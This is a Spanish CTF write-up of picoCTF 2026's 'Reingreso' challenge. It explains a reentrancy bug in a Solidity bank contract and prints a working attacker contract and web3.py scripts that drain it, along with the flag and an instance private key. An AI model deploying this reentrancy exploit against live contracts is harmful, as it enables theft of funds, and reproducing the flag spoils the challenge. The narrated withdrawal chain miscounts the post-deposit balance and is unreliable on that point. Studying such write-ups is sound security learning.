---
title: "Reingreso"
excerpt: "Writeup del reto 'Reingreso' (picoCTF 2026, categoria Blockchain, dificultad Duro, por OB)."
date: 2026-09-11
categories:
  - picoCTF 2026
  - Blockchain
tags:
  - picoCTF-2026
  - Hard
  - Blockchain
---

Writeup del reto "Reingreso" (picoCTF 2026, categoria Blockchain, dificultad Duro, por OB).

El nombre del reto ya adelanta la vulnerabilidad: "reentrancy" (reingreso). Un contrato Ethereum "VulnBank" gestiona depositos y retiros; su funcion withdraw() envia el ETH ANTES de descontar el saldo interno del usuario, el error clasico que rompe el patron "checks-effects-interactions". Objetivo: vaciar el saldo del banco hasta exactamente 0, lo que dispara automaticamente la revelacion de la flag dentro del propio contrato.

Bank Address: 0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF (10 ETH iniciales)  
Nodo RPC: crystal-peak.picoctf.net:64736 (chain id 31337, tipo Hardhat/Anvil)  
Cuenta de jugador: 0x99C8A8B41ed50Dd9e5FB185f064bA61Eec3282d0 (5 ETH para gas)  
Clave privada de la cuenta de jugador (proporcionada por el propio reto, especifica de esta instancia):  
0x7ccd99729ac6f851845b9d24ada3830a5dc976d8a827f7e8d3cb2f42f7e6f510

Flag obtenida:  
picoCTF{UpDaTe_St4ate5_1st_a315d109}

Este archivo recoge las tecnicas y comandos exactos para reproducirlo a mano, en orden.

> **Flag:** `picoCTF{UpDaTe_St4ate5_1st_a315d109}`

## 1. Obtencion de los datos de conexion

El enunciado del reto trae un contrato descargable (VulnBank.sol) y un enlace a una pagina web informativa con los datos de la instancia privada. Comando para obtenerla (el enlace real, no solo el texto "aqui" del enunciado):

```text
curl -s http://crystal-peak.picoctf.net:51915/
```

Esa pagina (solo informativa, "no es parte de la superficie de ataque") expone en HTML:

```text
Bank Address:      0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF
Initial Internal Balance: 10 ETH
Your Address:       0x99C8A8B41ed50Dd9e5FB185f064bA61Eec3282d0
Your Private Key:   0x7ccd99729ac6f851845b9d24ada3830a5dc976d8a827f7e8d3cb2f42f7e6f510
Initial Internal Balance (gas): 5 ETH
```

La pagina tambien hace polling a "/status" cada segundo para mostrar automaticamente la flag en cuanto el contrato la revele -- util como confirmacion visual, aunque no es necesaria para resolver el reto por linea de comandos.

## 2. Analisis del contrato vulnerable

Codigo fuente relevante de VulnBank.sol (Solidity ^0.6.12):

```text
mapping(address => uint) public balances;

function deposit() public payable {
    balances[msg.sender] += msg.value;
}

function withdraw(uint amount) public {
    require(balances[msg.sender] >= amount, "Insufficient funds available");

    (bool sent, ) = msg.sender.call{value: amount}("");   // <-- ENVIA el ETH PRIMERO
    balances[msg.sender] -= amount;                          // <-- descuenta DESPUES

    require(sent, "Transfer failed");

    if (!revealed && address(this).balance == 0) {
        revealed = true;
        emit FlagRevealed(flag);
    }
}
```

El orden esta invertido respecto al patron seguro "checks-effects-interactions": el ETH se envia con un low-level call ANTES de actualizar "balances[msg.sender]". El call activa el fallback/receive() del contrato receptor ANTES de que el saldo se haya descontado -- si ese receptor es otro contrato que vuelve a llamar "withdraw()" desde su propio receive(), el "require(balances[msg.sender] >= amount)" sigue viendo el saldo ORIGINAL (aun no restado), permitiendo repetir el retiro una y otra vez.

Bonus: la condicion final compara "address(this).balance == 0" (el saldo REAL en ETH del contrato, no el mapping interno) -- por eso el objetivo es vaciar literalmente todo el ETH del contrato, no solo manipular el mapping.

## 3. Preparacion del entorno (web3.py + compilador Solidity)

No habia herramientas de Ethereum instaladas. Se instalan sin necesidad de privilegios de root:

```text
pip install --user --break-system-packages web3 py-solc-x
```

"py-solc-x" descarga y gestiona el propio compilador "solc" bajo demanda. Se instala la version EXACTA que pide el pragma del contrato (^0.6.12):

```text
python3 -c "
import solcx
solcx.install_solc('0.6.12')
print(solcx.get_installed_solc_versions())
"
```

Verificacion de conectividad contra el nodo RPC del reto y lectura de balances iniciales:

```text
python3 -c "
from web3 import Web3
w3 = Web3(Web3.HTTPProvider('http://crystal-peak.picoctf.net:64736'))
print('connected:', w3.is_connected())
print('chain id:', w3.eth.chain_id)
bank = w3.to_checksum_address('0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF')
player = w3.to_checksum_address('0x99C8A8B41ed50Dd9e5FB185f064bA61Eec3282d0')
print('bank balance (wei):', w3.eth.get_balance(bank))
print('player balance (wei):', w3.eth.get_balance(player))
"
```

Salida: chain id 31337 (tipico de Hardhat/Anvil), bank=10 ETH, player=5 ETH -- coincide con lo anunciado en la pagina de detalles.

## 4. Diseno del contrato atacante

Se escribe un contrato "Attacker.sol" que deposita una cantidad, retira esa misma cantidad, y en su funcion receive() (invocada automaticamente al recibir el ETH del banco) vuelve a llamar "withdraw()" mientras el banco siga teniendo saldo -- pidiendo en cada reentrada el MINIMO entre la cantidad original depositada y lo que le quede al banco, para poder vaciarlo hasta EXACTAMENTE 0 (y no solo hasta "menos de una cuota"):

```text
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

interface IVulnBank {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Attacker {
    IVulnBank public bank;
    address public owner;
    uint public amount;

    constructor(address _bank) public {
        bank = IVulnBank(_bank);
        owner = msg.sender;
    }

    function attack() external payable {
        amount = msg.value;
        bank.deposit{value: amount}();
        bank.withdraw(amount);
    }

    receive() external payable {
        uint bankBal = address(bank).balance;
        if (bankBal > 0) {
            uint next = bankBal < amount ? bankBal : amount;
            bank.withdraw(next);
        }
    }

    function collect() external {
        (bool sent, ) = owner.call{value: address(this).balance}("");
        require(sent, "collect failed");
    }
}
```

Por que funciona: el "require(balances[msg.sender] >= amount)" del banco compara SIEMPRE contra el saldo ORIGINAL depositado (nunca se actualiza durante toda la cadena de reentradas de una misma transaccion), asi que cualquier "amount" menor o igual al deposito original sigue pasando la comprobacion en cada nivel de recursion. Al pedir siempre "min(saldo_actual_del_banco, deposito_original)", la ULTIMA llamada de la cadena retira exactamente lo que queda, dejando el banco en 0 sin que ninguna llamada intermedia falle (evitando que un "require(sent)" fallido revierta toda la cadena).

## 5. Compilacion y despliegue del contrato atacante

Compilacion con py-solc-x y despliegue firmado con la clave privada del jugador:

```text
import solcx
from web3 import Web3

w3 = Web3(Web3.HTTPProvider('http://crystal-peak.picoctf.net:64736'))
player  = w3.to_checksum_address('0x99C8A8B41ed50Dd9e5FB185f064bA61Eec3282d0')
priv    = '0x7ccd99729ac6f851845b9d24ada3830a5dc976d8a827f7e8d3cb2f42f7e6f510'
bank    = w3.to_checksum_address('0x6Fd09d4d9795a3e07EdDBD9a82c882B46a5A6deF')

src = open('Attacker.sol').read()
compiled = solcx.compile_source(src, output_values=['abi','bin'], solc_version='0.6.12')
_, iface = list(compiled.items())[0]
abi, bytecode = iface['abi'], iface['bin']

Attacker = w3.eth.contract(abi=abi, bytecode=bytecode)
tx = Attacker.constructor(bank).build_transaction({
    'from': player,
    'nonce': w3.eth.get_transaction_count(player),
    'gas': 2_000_000,
    'gasPrice': w3.eth.gas_price,
    'chainId': w3.eth.chain_id,
})
signed = w3.eth.account.sign_transaction(tx, priv)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print('Attacker deployed at:', receipt.contractAddress, 'status:', receipt.status)
```

Resultado: contrato desplegado correctamente (status 1) en la direccion devuelta por el recibo de la transaccion.

## 6. Ejecucion del exploit y obtencion de la flag

Se llama a "attack()" enviando 4 ETH (parte de los 5 ETH de gas del jugador, dejando margen de sobra para comisiones):

```text
attacker = w3.eth.contract(address=attacker_addr, abi=abi)
tx = attacker.functions.attack().build_transaction({
    'from': player,
    'value': w3.to_wei(4, 'ether'),
    'nonce': w3.eth.get_transaction_count(player),
    'gas': 3_000_000,
    'gasPrice': w3.eth.gas_price,
    'chainId': w3.eth.chain_id,
})
signed = w3.eth.account.sign_transaction(tx, priv)
tx_hash = w3.eth.send_raw_transaction(signed.raw_transaction)
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print('attack() tx status:', receipt.status, 'gas used:', receipt.gasUsed)
```

Con un deposito de 4 ETH sobre un banco de 10 ETH, la cadena de reentradas dentro de UNA SOLA transaccion fue: retira 4 (banco: 10->6), retira 4 (banco: 6->2), retira 2 = min(2,4) (banco: 2->0) -- tres niveles de reentrada, banco exactamente en 0.

Verificacion final leyendo directamente el estado del contrato del banco (ABI minima, solo las funciones necesarias):

```text
bank_abi = [
  {"inputs":[],"name":"revealed","outputs":[{"type":"bool"}],"stateMutability":"view","type":"function"},
  {"inputs":[],"name":"getFlag","outputs":[{"type":"string"}],"stateMutability":"view","type":"function"}
]
bank_c = w3.eth.contract(address=bank, abi=bank_abi)
print('revealed:', bank_c.functions.revealed().call())
print('flag:', bank_c.functions.getFlag().call())
```

Salida obtenida:

```text
bank balance after: 0 ETH
attacker contract balance: 14 ETH        (10 del banco + 4 depositados)
revealed: True
flag: picoCTF{UpDaTe_St4ate5_1st_a315d109}
```

FLAG: picoCTF{UpDaTe_St4ate5_1st_a315d109}

La pagina web de estado (nodo 1) tambien se actualiza sola en ese momento, mostrando el mensaje "Bank Drained! That's impossible! Fine... Here's your flag" -- confirmacion visual adicional, no necesaria para resolver el reto.
